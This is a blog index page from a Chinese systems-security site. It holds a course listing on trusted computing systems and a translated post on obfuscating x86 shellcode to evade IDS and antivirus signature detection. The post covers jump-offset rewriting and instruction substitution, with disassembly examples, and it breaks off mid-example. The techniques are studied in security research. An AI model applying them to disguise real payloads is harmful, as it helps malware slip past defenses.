<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Index of Computer System and Security</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
    <meta name="keywords" content="computer system, computer security" />
  
  
  
  
  <meta name="description" content="FROM 0 TO 1">
<meta property="og:type" content="website">
<meta property="og:title" content="Index of Computer System and Security">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="Index of Computer System and Security">
<meta property="og:description" content="FROM 0 TO 1">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Index of Computer System and Security">
<meta name="twitter:description" content="FROM 0 TO 1">
  
    <link rel="alternate" href="/atom.xml" title="Index of Computer System and Security" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/hiero.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >

</head>

<body>
  <header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            <a href="/" title="Index of Computer System and Security" rel="home">
              Index of Computer System and Security</a>
          </h1>
          <div class="site-description">FROM 0 TO 1</div>

            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>
            <div class="clearfix sf-menu">

              <ul id="main-nav" class="nmenu sf-js-enabled">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">首页</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/syssec">系统安全</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/architecture">系统结构</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/virtualization">虚拟化</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/malware">恶意代码</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/conferences">主流会议</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/courses">名人课堂</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/academy">学术专家</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/contribution">本站达人</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/donation">打赏支持</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
                    
              </ul>
            </div>
          </nav>


      </div>
  </div>
</header>


  <div style="background:#fff;width: 100%;">

      <div style="max-height:600px; overflow: hidden;">
        <img width="100%" alt="Hike News" src="/css/images/pose.jpg">
      </div>

  </div>



  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main">
  
    <article id="post-course-byoungyounglee1"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170223/course-byoungyounglee1/">名人课堂-安全与可信系统</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170223/course-byoungyounglee1/" class="article-date">
	  <time datetime="2017-02-23T09:13:05.000Z" itemprop="datePublished">二月 23, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>CSysSec注</strong>： 本系列文章在于收集知名海外教授在计算机系统与安全领域的授课信息，会包含课程详细信息以及slides。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170223/course-byoungyounglee1/" target="_blank" rel="external">安全与可信系统</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec</a></p>
<hr>
<p>来源：<a href="https://lifeasageek.github.io/class/cs590-sts/" target="_blank" rel="external">https://lifeasageek.github.io/class/cs590-sts/</a></p>
<h3 id="教授"><a href="#教授" class="headerlink" title="教授"></a>教授</h3><p><a href="http://www.csyssec.org/20170224/byoungyounglee/" target="_blank" rel="external">Byongyong Lee</a> </p>
<h3 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h3><p>This course focuses on studying security techniques for trusted computing systems. The course starts with discussing software/system security fundamentals and principals for designing and building trusted computing systems. Then we study comprehensive security oriented hardenning techniques for trusted computing platforms as well as promising new services and applications. Lastly we will cover possible attacks and defenses against trusted computing systems.</p>
<p>The course will be mostly based on research papers. Each lecture will cover one research paper, and each student is expected to present a few research papers (one or two) throughout the semester. In order to facilitate discussion, all students are strongly encouraged to read the paper before the class and actively participate the in-class discussion. Students are also required to pick the research topic related to the class, and perform their own research project.</p>
<pre><code>Instructor : Byoungyoung Lee 
Lecture: 4:30 pm - 5:45 pm (Tue &amp; Thr) at Lawson B134
Office hour: 3:30 pm - 4:30 pm (Tue &amp; Thr) at LWSN 1187
</code></pre><h3 id="课程安排"><a href="#课程安排" class="headerlink" title="课程安排"></a>课程安排</h3><table>
<thead>
<tr>
<th style="text-align:left">Date</th>
<th style="text-align:left">Topic</th>
<th style="text-align:left">Paper</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">01/10</td>
<td style="text-align:left">Introduction online meetup</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">01/12</td>
<td style="text-align:left">No class travel</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">01/17</td>
<td style="text-align:left">Introduction</td>
<td style="text-align:left">Intro. on trusted computing (1)    </td>
</tr>
<tr>
<td style="text-align:left">01/19</td>
<td style="text-align:left">Introduction</td>
<td style="text-align:left">Intro. on trusted computing (2) </td>
</tr>
<tr>
<td style="text-align:left">01/24</td>
<td style="text-align:left">Toward trusted computing</td>
<td style="text-align:left">AEGIS [ICS 03]</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">01/26</td>
<td style="text-align:left">Toward trusted computing</td>
<td style="text-align:left">SecVisor [SOSP 07]    </td>
</tr>
<tr>
<td style="text-align:left">01/31</td>
<td style="text-align:left">Toward trusted computing</td>
<td style="text-align:left">OverShadow [ASPLOS 08]</td>
</tr>
<tr>
<td style="text-align:left">02/02</td>
<td style="text-align:left">Toward trusted computing</td>
<td style="text-align:left">Flicker [EuroSys 08]</td>
</tr>
<tr>
<td style="text-align:left">02/07</td>
<td style="text-align:left">Toward trusted computing</td>
<td style="text-align:left">TrustVisor [SP 10]    </td>
</tr>
<tr>
<td style="text-align:left">02/09</td>
<td style="text-align:left">Toward trusted computing</td>
<td style="text-align:left">TrustZone-TLR [ASPLOS 14]    </td>
</tr>
<tr>
<td style="text-align:left">02/14</td>
<td style="text-align:left">SandBox for trusted computing</td>
<td style="text-align:left">Haven [OSDI 14]</td>
</tr>
<tr>
<td style="text-align:left">02/16</td>
<td style="text-align:left">SandBox for trusted computing</td>
<td style="text-align:left">No class    </td>
</tr>
<tr>
<td style="text-align:left">02/21</td>
<td style="text-align:left">SandBox for trusted computing</td>
<td style="text-align:left">A2C [NDSS 17] (practice talk)    </td>
</tr>
<tr>
<td style="text-align:left">02/21</td>
<td style="text-align:left">SandBox for trusted computing</td>
<td style="text-align:left">Graphene [EuroSys 14] (makeup)</td>
</tr>
<tr>
<td style="text-align:left">02/23</td>
<td style="text-align:left">SandBox for trusted computing</td>
<td style="text-align:left">VC3 [SP 15]    </td>
</tr>
<tr>
<td style="text-align:left">02/23</td>
<td style="text-align:left">SandBox for trusted computing</td>
<td style="text-align:left">Ryoan [OSDI 16] (makeup)</td>
</tr>
<tr>
<td style="text-align:left">02/28</td>
<td style="text-align:left">-    No class (NDSS travel)    </td>
</tr>
<tr>
<td style="text-align:left">03/02</td>
<td style="text-align:left">-    No class (NDSS travel)    </td>
</tr>
<tr>
<td style="text-align:left">03/07</td>
<td style="text-align:left">SandBox for trusted computing</td>
<td style="text-align:left">MiniBox [ATC 14]</td>
</tr>
<tr>
<td style="text-align:left">03/07</td>
<td style="text-align:left">Trusted services</td>
<td style="text-align:left">CyprtDB [SOSP 11] (makeup)    </td>
</tr>
<tr>
<td style="text-align:left">03/09</td>
<td style="text-align:left">SandBox for trusted computing</td>
<td style="text-align:left">Scone [OSDI 16]    </td>
</tr>
<tr>
<td style="text-align:left">03/14</td>
<td style="text-align:left">-    No class (Spring break)    </td>
</tr>
<tr>
<td style="text-align:left">03/16</td>
<td style="text-align:left">-    No class (Spring break)    </td>
</tr>
<tr>
<td style="text-align:left">03/21</td>
<td style="text-align:left">Trusted services</td>
<td style="text-align:left">BlindBox [SIGCOMM 15]</td>
</tr>
<tr>
<td style="text-align:left">03/23</td>
<td style="text-align:left">Trusted services</td>
<td style="text-align:left">Embark [NSDI 16]    </td>
</tr>
<tr>
<td style="text-align:left">03/28</td>
<td style="text-align:left">Trusted services</td>
<td style="text-align:left">Secure Mylar [NSDI 14]</td>
</tr>
<tr>
<td style="text-align:left">03/30</td>
<td style="text-align:left">Securing access patterns</td>
<td style="text-align:left">Path ORAM [CCS 13]    </td>
</tr>
<tr>
<td style="text-align:left">04/04</td>
<td style="text-align:left">Securing access patterns</td>
<td style="text-align:left">Raccoon [SEC 15]    </td>
</tr>
<tr>
<td style="text-align:left">04/06</td>
<td style="text-align:left">Securing access patterns</td>
<td style="text-align:left">Oblivious multi-party ML [SEC 16]    </td>
</tr>
<tr>
<td style="text-align:left">04/11</td>
<td style="text-align:left">Attacks/Defenses</td>
<td style="text-align:left">Iago Attacks [ASPLOS 13]    </td>
</tr>
<tr>
<td style="text-align:left">04/13</td>
<td style="text-align:left">Attacks/Defenses</td>
<td style="text-align:left">Controlled-channel attacks [SP 15]    </td>
</tr>
<tr>
<td style="text-align:left">04/18</td>
<td style="text-align:left">Attacks/Defenses</td>
<td style="text-align:left">Memoir [SP 11]    </td>
</tr>
<tr>
<td style="text-align:left">04/20</td>
<td style="text-align:left">Attacks/Defenses</td>
<td style="text-align:left">StealthMem [SEC 12]</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">04/25</td>
<td style="text-align:left">-    Final presentation    </td>
</tr>
<tr>
<td style="text-align:left">04/27</td>
<td style="text-align:left">-    Final presentation</td>
</tr>
</tbody>
</table>
<h3 id="完整论文阅读列表"><a href="#完整论文阅读列表" class="headerlink" title="完整论文阅读列表"></a>完整论文阅读列表</h3><ul>
<li>Toward trusted computing<ul>
<li>(XOM) Architectural Support for Copy and Tamper Resistant Software [ASPLOS 00] </li>
<li>AEGIS: architecture for tamper-evident and tamper-resistant processing [ICS 03] </li>
<li>SecVisor: a tiny hypervisor to provide lifetime kernel code integrity for commodity OSes [SOSP 07] </li>
<li>Overshadow: a virtualization-based approach to retrofitting protection in commodity operating systems [ASPLOS 08] </li>
<li>InkTag: secure applications on an untrusted operating system [ASPLOS 13] </li>
<li>Flicker: An execution infrastructure for TCB minimization [EuroSys 08]</li>
<li>TrustVisor: Efficient TCB reduction and attestation [SP 10] </li>
<li>(TrustZone-TLR) Using ARM TrustZone to Build a Trusted Language Runtime for Mobile Applications [ASPLOS 14] </li>
</ul>
</li>
<li>SandBox/Containers for trusted computing<ul>
<li>MiniBox: A two-way sandbox for x86 native code [ATC 14] </li>
<li>VC3: trustworthy data analytics in the cloud using SGX [SP 15] </li>
<li>Ryoan: A Distributed Sandbox for Untrusted Computation on Secret Data [OSDI 16] </li>
<li>(Graphene) Cooperation and Security Isolation of Library OSes for Multi-Process Applications [EuroSys 14] </li>
<li>SCONE: Secure Linux Containers with Intel SGX [OSDI 16] </li>
<li>Shielding Applications from an Untrusted Cloud with Haven [OSDI 14] </li>
</ul>
</li>
<li>Trusted Services<ul>
<li>Secure Untrusted Data Repository (SUNDR) [OSDI 04] </li>
<li>CryptDB: protecting confidentiality with encrypted query processing [SOSP 11] </li>
<li>BlindBox: Deep packet inspection over encrypted traffic [SIGCOMM 15] </li>
<li>Embark: Securely Outsourcing Middleboxes to the Cloud [NSDI 16] </li>
<li>Building web applications on top of encrypted data using Mylar [NSDI 14] </li>
</ul>
</li>
<li>Securing access patterns<ul>
<li>Path ORAM: An Extremely Simple Oblivious RAM Protocol [CCS 13] </li>
<li>Raccoon: Closing Digital Side-Channels through Obfuscated Execution [SEC 15] </li>
<li>Oblivious multi-party machine learning on trusted processors [SEC 16] </li>
</ul>
</li>
<li>Attacks and defenses<ul>
<li>Iago attacks: why the system call API is a bad untrusted RPC interface [ASPLOS 13] </li>
<li>Controlled-channel attacks: Deterministic side channels for untrusted operating systems [SP 15] </li>
<li>Memoir: Practical state continuity for protected modules [SP 11] </li>
<li>STEALTHMEM: System-Level Protection Against Cache-Based Side Channel Attacks in the Cloud [SEC 12] </li>
<li>Drammer: Deterministic Rowhammer Attacks on Mobile Platforms [CCS 16] </li>
</ul>
</li>
<li>Papers to appear<ul>
<li>Enhancing Security and Privacy of Tor’s Ecosystem by using Trusted Execution Environments [NSDI 17]</li>
<li>SGX-Shield: Enabling Address Space Layout Randomization for SGX Programs [NDSS 17]</li>
<li>T-SGX: Eradicating Controlled-Channel Attacks Against Enclave Programs [NDSS 17]</li>
<li>Panoply: Low-TCB Linux Applications With SGX Enclaves [NDSS 17]</li>
<li>BOOMERANG: Exploiting the Semantic Gap in Trusted Execution Environments [NDSS 17]</li>
<li>ObliviSync: Practical Oblivious File Backup and Synchronization [NDSS 17]</li>
</ul>
</li>
</ul>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章在于收集知名海外教授在计算机系统与安全领域的授课信息，会包含课程详细信息以及slides。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170223/course-byoungyounglee1/" target="_blank" rel="external">安全与可信的系统</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec</a></p>
<hr>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/名人课堂/">名人课堂</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Course/">Course</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Professor/">Professor</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-obfuscation1"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170223/obfuscation1/">X86 Shellcode代码混淆(一)</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170223/obfuscation1/" class="article-date">
	  <time datetime="2017-02-23T08:03:26.000Z" itemprop="datePublished">二月 23, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>来源： <a href="https://breakdev.org/" target="_blank" rel="external">https://breakdev.org/</a><br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170223/obfuscation1/" target="_blank" rel="external">X86 shellcode代码混淆</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p>为了了解开发一个可以接受所有二进制x86 shellcode的工具并且由此形成独一无二的版本，我决定在shellcode混淆问题上做些研究。</p>
<p>值得一提的是这种工具尤其当填充数据代码需要储存在磁盘中时在脚本中最为实用（比如嵌入在可执行文件中）。易混淆的填充数据会扩大是我们不太愿意看到的结果，尤其当这类工具被嵌入到利用有效载荷时首选的是小型shellcode。</p>
<p>存在shellcode混淆的主要原因是由IDS或AV产品执行的静态或运行时间签名探测。以[Metasploit][<a href="https://www.metasploit.com/]为例，它的利用有效载荷已经公开很多年，至今为止最主流IDS/AV解决方案能够通过搜索它们关于恶意软件签名的庞大数据库来检测它们。" target="_blank" rel="external">https://www.metasploit.com/]为例，它的利用有效载荷已经公开很多年，至今为止最主流IDS/AV解决方案能够通过搜索它们关于恶意软件签名的庞大数据库来检测它们。</a></p>
<p>为了避免被检测出而手动修改或从头开始编写新的shellcodes是一个无限的工作，而且长远来讲很浪费时间。我所关注的将是编写一个可以接受所有二进制形式的shellcode的工具，它可以修改指令同时保留其功能，但代码会变得特殊而更难分析。</p>
<p>我需要在这里说明，这篇文章不会包含通过行为分析或应用于不同安全产品的代码仿真的内容。</p>
<p>有些人会说有一种方式可以让shellcode绕过签名检测方法——使用[Shikata Ga Nai][<a href="https://www.exploit-db.com/docs/18532.pdf]编码器。shellcode密码本身在运行时间利用亦或，这意味着shellcode所在的存储区应是**可写的**，但常常并不是这样。这种方法在安全软件的代码仿真中也不能幸免于运行签名。" target="_blank" rel="external">https://www.exploit-db.com/docs/18532.pdf]编码器。shellcode密码本身在运行时间利用亦或，这意味着shellcode所在的存储区应是**可写的**，但常常并不是这样。这种方法在安全软件的代码仿真中也不能幸免于运行签名。</a></p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>每个shellcode为能在所有存储单元运行来编写的。这意味着所有转移或储存参量都与它的当前位置有关，并没有固定的存储位置。</p>
<p>当然也有以下例外，直接来自Metasploit的有效载荷之一：</p>
<pre><code>66 0000008d:5d               POP EBP
67 0000008e:6a01             PUSH 0x1
68 00000090:8d85b2000000     LEA EAX,[EBP+0xb2];&lt;--fixed offset that willbreak things when we insert code after this line!
69 00000096:50               PUSH EAX
70 00000097:68318b6f87       PUSH DWORD 0x876f8b31
71 0000009c:ffd5             CALL EBP
</code></pre><p>为了产生混淆代码，这个工具需要以下条件：</p>
<ul>
<li>能够在现有指令的前、后或其间插入新的指令</li>
<li>能够在添加或删去指令时修订相对跳转偏移</li>
<li>能够用可替换指令替代已存在的指令以确定没有静态数据被落下，这些数据会协助检测签名的创写</li>
<li>能够嵌入可以改变执行流并随机把shellcode分配到不同码块的跳转指令</li>
</ul>
<p>第一条并不是那么难达到，不过也有陷阱，所有调用/跳转指令指向相对内存位置，这就像“<em>从这个指令向前或向后跳转X字节</em>”。这就是说，如果我们在跳转指令和它的目标之间插入任何字节，相对跳转偏移会被我们插入的字节数修正掉。</p>
<p>第二条包括：在shellcode中跟踪记录所有相对跳转，还有每当我们在跳转偏移的开始和目标之间增加或删减代码数据时调整跳转偏移。</p>
<p>第三条需要适当反编译指令的正确指纹并在保留原有功能的前提下把他们重创为不同的指令。</p>
<p>第四条要求会允许改变shellcode的执行流，把它分配到不同的码块，完全改变顺序，指令按初始放置。</p>
<h3 id="修正跳转"><a href="#修正跳转" class="headerlink" title="修正跳转"></a>修正跳转</h3><hr>
<p>你可能会觉得在这时修正跳转指令不应该那么难了，我们只需要调整相对存储偏移就好。问题是，跳转可能<code>近</code><br>可能<code>远</code>，短跳转存储偏移有<code>1字节</code>那么大而远的就有<code>4字节</code>。我们来看一个例子，存储在<code>401000</code>储存位置的<code>jnz 401020</code>指令：</p>
<p>近跳转：<code>00401000: 75 1E</code><br><code>75</code>- <strong>JNZ</strong> 操作码<br><code>1E</code>-向前跳转<strong>OX1E</strong>字节（<code>0x401020 - 0x401000 - instruction length [2 bytes])</code>）</p>
<p>远跳转：<code>00401000: 0F 85 1A 00 00 00</code><br><code>0F 85</code>- <strong>JNZ</strong> 操作码<br><code>1A 00 00 00</code>-向前跳转<strong>OX1A</strong>字节（<code>0x401020 - 0x401000 - instruction length [4 bytes])</code>）</p>
<p>正如你所看到的，这两种指令都执行相同的操作，却在编写上有所不同。并且与指令并用的相对存储偏移也受指令长度本身的影响。这一点需要牢记于心。</p>
<p>现在让我们来看看以下的代码：</p>
<pre><code>00401000: 75 7E : jnz 00401080  
...
00401080: 90 : nop
</code></pre><p><strong>JNZ</strong>指令是<code>75 7E</code>,但如果我们把4字节插入到<code>00401000</code>与<code>00401080</code>地址之间呢？合理的做法是增加4个相对存储偏移，变成<code>75 82</code>. 来看一下修正后的指令：</p>
<pre><code>00401000: 75 82 : jnz 00400F84  
...
-- added 4 bytes --
...
00401084: nop  
</code></pre><p>现在指令向后跳转吗？是的。短跳转的相对存储偏移是值在<strong>-128</strong>到<strong>127</strong>之间的<code>1符号字节</code>。<code>0x82</code>在这个例子中实际上被当作<strong>-126</strong>.</p>
<p>当插入字节时我们需要非常小心。这个工具同样需要检测指令是否需要从<code>短</code>转成<code>长</code>。从先前例子中进行正确的跳转修订如下：</p>
<pre><code>00401000: 0F 85 7E 00 00 00 : jnz 00401084  
...
-- added 4 bytes --
...
00401084: nop  
</code></pre><p>每次插入字节时，这个工具需要找到受影响的跳转指令并检测修订相对地址是否也包括替代有着更长替代的受影响的跳转指令。</p>
<p>遗憾的是还有另一个并发症需要处理。</p>
<h2 id="问题跳转"><a href="#问题跳转" class="headerlink" title="问题跳转"></a>问题跳转</h2><p>一些操作短记忆偏移指令没有它们的长替代，意思就是在这种情况下不容易用另一个替代一个指令。相反，为了正确地处理这些指令，我们需要用多个其他指令替代这一个同时保留原有指令的功能。</p>
<p>问题指令包括：<code>LOOP</code>，<code>JECXZ</code>,<code>LOOPNZ</code>,<code>LOOPZ</code></p>
<p>好在我从Randall Hyde的《[汇编语言程序设计的艺术][<a href="https://courses.engr.illinois.edu/ece390/books/artofasm/CH06/CH06-5.html]》找到了一个非常有用的章节，这本书涵盖了上述指令的替代：" target="_blank" rel="external">https://courses.engr.illinois.edu/ece390/books/artofasm/CH06/CH06-5.html]》找到了一个非常有用的章节，这本书涵盖了上述指令的替代：</a></p>
<p><strong>JECXZ</strong></p>
<pre><code>jecxz Target 
</code></pre><p>   变成：</p>
<pre><code>test ecx, ecx        ;Sets the zero flag if ecx=0  
jz Target  
</code></pre><p><strong>LOOP</strong></p>
<pre><code>loop Target  
</code></pre><p>   变成：</p>
<pre><code>dec ecx  
jnz Target 
</code></pre><p><strong>LOOPNZ/LOOPZ</strong></p>
<pre><code>loopnz/loopz Target  
</code></pre><p>   变成：</p>
<pre><code>  jnz/jz quit
  dec ecx
  jz quit2
  jmp Target
quit:  
  dec ecx
quit2:  
</code></pre><p>在混淆工具中，为了避免后续问题，我决定用在开头的长替代代替问题指令。</p>
<h2 id="数据分组"><a href="#数据分组" class="headerlink" title="数据分组"></a>数据分组</h2><p>大多shellcodes嵌入一些不是代码的二进制数据形式。着可能是一个用于执行的命令，用于IP地址连接到反向壳或者是其他任何不应该被看作代码的东西。让反汇编程序分辨代码和数据是不可能的。</p>
<p>在我们让工具执行任何代码混淆之前，我们需要有让用户列举真正代码指令所在的能力并让工具把其他看作可以在混淆过程中被跳过的数据。</p>
<h2 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h2><p>现在，有趣的部分开始了。</p>
<p>这个工具可以正确解析反汇编代码。它可以插入并删除指令在这同时修改可能在该过程中被影响相对跳转。现在逝世后让这个工具做真正的工作并用随机而独特的等效物。</p>
<p>我们越支持不同指令，输出的shellcode就会更加独特。</p>
<p>我会从单个指令开始，在之后的部分慢慢加入更多指令。</p>
<p><strong>MOV REG， IMM</strong><br>（将直接静态值移动到寄存器）</p>
<p>例如：</p>
<pre><code>B8 EF BE AD DE   : MOV EAX, 0xDEADBEEF  
66 BA FE CA      : MOV DX, 0xCAFE  
B1 77            : MOV CL, 0x77  
</code></pre><p>这是最简单的指令之一，但是如果我们不替代这些，它会成为写出检测shellcode有效签名的信息来源。</p>
<p>在这里我不会十分详细地深入讲述x86指令是如何编码的。如果你想要（也应该）更深入的学习，你可以在以下的链接中找到有用的信息。<br>[x86 Instruction Encoding Revealed: Bit Twiddling for Fun and Profit][<a href="https://www.codeproject.com/articles/662301/x-instruction-encoding-revealed-bit-twiddling-fo" target="_blank" rel="external">https://www.codeproject.com/articles/662301/x-instruction-encoding-revealed-bit-twiddling-fo</a>]<br>[Encoding Real x86 Instructions][<a href="http://www.c-jump.com/CIS77/CPU/x86/lecture.html" target="_blank" rel="external">http://www.c-jump.com/CIS77/CPU/x86/lecture.html</a>]<br>[X86 Opcode and Instruction Reference][<a href="http://ref.x86asm.net/coder32.html" target="_blank" rel="external">http://ref.x86asm.net/coder32.html</a>]<br><strong>MOV R16/32, IMM16/32</strong>指令由<code>0xB8</code>操作码开始。伴随指令使用的寄存器值保存在操作码的<strong>最低 3 bits</strong>.</p>
<p>寄存器值如下：</p>
<pre><code>EAX/AX/AL : 000b / 00h  
ECX/CX/CL : 001b / 01h  
EDX/DX/DL : 010b / 02h  
EBX/BX/BL : 011b / 03h  
ESP/SP/AH : 100b / 04h  
EBP/BP/CH : 101b / 05h  
ESI/SI/DH : 110b / 06h  
EDI/DI/BH : 111b / 07h  
</code></pre><p>为了用我们想要的寄存器形成操作码值，我们需要在操作码初始值中加入寄存器值（<code>OxB8</code>）.</p>
<pre><code>B8 44 33 22 11 : MOV EAX, 11223344h  
BA 44 33 22 11 : MOV EDX, 11223344h  
</code></pre><p>如果我们想使用16-bit而不是32-bit的寄存器和值，技巧是在操作码之前加入<code>0x66</code>字节的前缀。</p>
<pre><code>66 B8 22 11 : MOV AX, 1122h  
66 BA 22 11 : MOV DX, 1122h  
</code></pre><p><strong>MOV R8, IMM8</strong>与前面的类似。唯一的不同是这个操作码的初始值是<code>0xB0</code>.</p>
<pre><code>B0 11 : MOV AL, 11h  
B2 11 : MOV DL, 11h  
</code></pre><p>总的来讲，为了正确的检测<strong>MOV REG, IMM</strong>指令，我们需要寻找由<code>0xB0</code>到<code>0xBF</code>字节范围的操作码并且也要记住第一个字节可能由<code>0x66</code>做前缀，指令在16-bit模式下。</p>
<p>我们将会把每个指令转化成几个能够执行原始立即值运算的几个<strong>ADD,SUB</strong>or<strong>XOR</strong>指令。</p>
<p>以下是这个混淆的具体例子：</p>
<p>前：</p>
<pre><code>B8 44 33 22 11 : MOV EAX, 0x11223344 
</code></pre><p>后：</p>
<pre><code>BA 38 2C 30 A2    : MOV EDX, 0xA2302C38  
81 C2 BD 85 4F D8 : ADD EDX, 0xD84F85BD  
81 EA E0 5C 59 BF : SUB EDX, 0xBF595CE0  
81 F2 1C 9A 82 23 : XOR EDX, 0x23829A1C  
81 F2 4D FC 86 89 : XOR EDX, 0x8986FC4D  
</code></pre><p>得到：</p>
<pre><code>EDX = 0xA2302C38 + 0xD84F85BD - 0xBF595CE0 ^ 0x23829A1C ^ 0x8986FC4D = 0x11223344
</code></pre><p>你可以看到这个指令现在已经完全不同了，但是仍然在前一指令执行后，<strong>EDX</strong>会以<code>0x11223344</code>为初始值。我们可以产生很多想要的运算指令。</p>
<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>考虑到为让便于更多读者尝试，我决定在Python中写这个工具。尽管我自己进行了一点简单的拆装来对几个指令类型采指纹，我需要一个可以对每个拆卸了的指令长度的全面反汇编程序字典。</p>
<p>为此，我用吉尔·达巴赫(Gil Dabah)所写的[diStorm3][<a href="https://breakdev.org/x86-shellcode-obfuscation-part-1/]反汇编程序字典，它快而好用。我认为用[Capstone][http://www.capstone-engine.org/]有点大材小用。" target="_blank" rel="external">https://breakdev.org/x86-shellcode-obfuscation-part-1/]反汇编程序字典，它快而好用。我认为用[Capstone][http://www.capstone-engine.org/]有点大材小用。</a></p>
<p>现在这个工具的版本只在<strong>MOV REG,IMM</strong>指令产生混淆，但即将支持更多的指令。</p>
<p>以下是无用shellcode的例子，为方便检测，我准备展示一下它的混淆：</p>
<p>输入：</p>
<pre><code>0    00000000: fc                               CLD  
1    00000001: b105                             MOV CL, 0x5  
2    00000003: 80fc02                           CMP AH, 0x2  
3    00000006: 7504                             JNZ 0xc  
4    00000008: 66b88888                         MOV AX, 0x8888  
